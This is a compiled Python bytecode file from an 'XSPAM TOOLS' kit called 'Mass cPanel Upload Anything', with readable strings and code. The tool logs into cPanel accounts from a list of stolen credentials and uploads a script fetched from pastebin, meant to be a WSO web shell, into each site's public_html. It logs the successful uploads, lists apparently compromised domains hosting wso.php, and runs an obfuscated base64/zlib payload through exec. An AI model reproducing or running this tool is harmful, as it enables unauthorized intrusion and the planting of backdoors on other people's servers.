ó
^c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d l Te   d Z d Z d Z d Z d	 Z d
 Z d Z e e e GHd Z y e j d  Wn n Xd   Z d Z e j  e j! e   d Ud   Z" e d k r}e   ne d k ryò d Z# e e# e GHe$ e d e  Z% d Z# e e# e GHe$ e d e  Z& e$ e d e  Z' e  j( e&  j) Z* y. e+ e% d   Z( e( j,   j-   Z, Wd QXWn e. k
 rAn Xe/ e,  Z, y" e d  Z0 e0 j1 e" e,  Z2 Wn n XWqqXn  d S(   iÿÿÿÿN(   t   Pool(   t   system(   t   *s   V1.3-2s   [31ms   [32ms   [34ms   [33ms   [37msQ  
====================================================================
----------------------------- XSPAM TOOLS --------------------
------------ More Tools: https://xspamtools.me ---------------
====================================================================

   _____                        _ 
  / ____|                      | |
 | |     _ __   __ _ _ __   ___| |
 | |    | '_ \ / _` | '_ \ / _ \ |
 | |____| |_) | (_| | | | |  __/ |
  \_____| .__/ \__,_|_| |_|\___|_|
        | |                       
        |_|                       

                                                                                      
MASS CPANEL UPLOAD ANYTHING
CPANEL MUST SUPPORT HOST FUNCTION
Note: Success uploaded file will be stored in result                              

====================================================================
i   t   resultsc          C   s   d }  t  |  t GHd  S(   Ns#  
Rules: must use wso shell this one --> https://pastebin.com/Ds35ij44


1. Mass shell to anything uploader! 
	Put shell list like this
		http://toprose24.ru/wp-includes/js/tinymce/wso.php
		http://nacso.org/wp-admin/shop/media/wso.php
		http://www.systemawindsor.com/2014/wso.php
		http://heights.co.kr/wp-includes/js/tinymce/wso.php
		http://mybaguse.com/oldsite/wp-includes/wso.php
		http://bdsharebazar.info/wp-includes/Core/wso.php
		http://www.modsolar.net/wp-content/uploads/wso.php
		http://theknittingneedle.in//wp-includes/css/wso.php



(   t   yellowt   white(   t   gd(    (    s
   masscp8.pyt   guide?   s    st   eNpLSU1TyMlMTs0rTtUoLinKzEvXtOLlAgkp2CoUpRaWphaXFOulp5ZoKGWUlBQUW+nrV5Tk5+cU6+Wm6hcnlqUW6ackliTag5i2SgraClBDAE5FHno=c         C   sï  yát  d } |  j d  \ } } } t j d |  } | d } t j   } | d } i | d 6| d 6} | j | d | }	 d	 |	 j k rËt d
 |   t j d |	 j  }
 | d |
 d d } i d | d d 6} i | t	 f d 6} | j | d | d | } t j
 d | d |  } | j d k r«t d | d | d t GHt j d  t d d  j d | d | d  t d! | d |  t j d  qàt d | d | d t GHn t d | d  t GHWn n Xd  S("   Ns   name.phpt   |s   https://(.*?):2083i    s   /login/?login_only=1t   usert   passt   datat   security_tokens   cp -> s   "redirect":"/(.*?)/frontend/t   /s   /execute/Fileman/upload_filess   /home/s   /public_html/t   dirs   file-t   filess   http://iÈ   s   [+] http://s    ==> Upload Success!R   s   success_upload_cPanel.txtt   as   
s	   shell -> s   ..s   [-] http://s    ==> Upload Failed!s   [-] s    ==> Login invalids   shell -> http://(   t	   shellnamet   splitt   ret   findallt   requestst   Sessiont   postt   contentt   licenset
   scriptmaint   gett   status_codet   greenR   t   ost   chdirt   opent   writet   red(   t   urlt   filenamet   domaint   usernamet   pwdt   domt   libt   hostt   logt   reqt   apicpt   sitet   path_upt   uploadfilest   req_uploadert	   checkfile(    (    s
   masscp8.pyt   tool8U   s6    


& i    sE   [?] Enter cPanel like this -> https://sitee.me:2083|username|passwords   [?] Enter cPanels list: sL   [?] Enter pastebin raw script like this -> https://pastebin.com/raw/DZAXcMy7s   [?] Enter link script: s   [?] Enter script name: t   ri
   (3   R   t   sysR   R   t   randomt   urllib2t   urllibt   httplibt   sockett   sslt   stringt   base64t   zlibt   multiprocessingR    t   multiprocessing.dummyt
   ThreadPoolt   platformR   t   coloramat   initt   currentVersionR"   R   t   blueR   R   t   combot   choicet   mkdirR   t   singlelicenset
   decompresst	   b64decodeR3   t   examplet	   raw_inputt	   listshellt	   scripturlR   R   R   R   R    t   readt
   splitlinest   IOErrort   listt   ppt   mapt   pr(    (    (    s
   masscp8.pyt   <module>   sv   
		4
